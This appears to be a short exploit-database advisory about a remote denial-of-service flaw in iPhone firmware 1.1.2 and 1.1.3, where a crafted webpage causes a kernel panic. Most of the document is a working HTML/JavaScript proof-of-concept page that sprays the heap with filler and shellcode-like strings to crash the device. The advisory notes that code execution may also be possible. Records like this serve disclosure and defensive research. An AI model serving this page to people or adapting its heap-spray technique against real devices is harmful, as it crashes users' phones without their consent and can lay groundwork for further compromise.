Apple iPhone is prone to a remote denial-of-service vulnerability.

Attackers can exploit this issue by enticing an unsuspecting user to view a maliciously crafted webpage. Successful attacks cause a kernel panic, crashing the device. Given the nature of this issue, remote code execution may also be possible, but this has not been confirmed.

iPhone 1.1.2 and 1.1.3 are affected; other versions may also be vulnerable.

<html><body><script> function Demo() { var shellcode; var addr; var fill; alert('attempting a crash!'); shellcode = unescape('%u0c0c'); fill = unescape('%ucccc'); addr = 0x02020202; var b = fill; while (b.length <= 0x40000) b+=b; var c = new Array(); for (var i =0; i<36; i++) { c[i] = b.substring(0, 0x100000 - shellcode.length) + shellcode + b.substring(0, 0x100000 - shellcode.length) + shellcode + b.substring(0, 0x100000 - shellcode.length) + shellcode + b.substring(0, 0x100000 - shellcode.length) + shellcode; } } </script> <input type='button' onClick='Demo()' value='Go!'> </body></html>
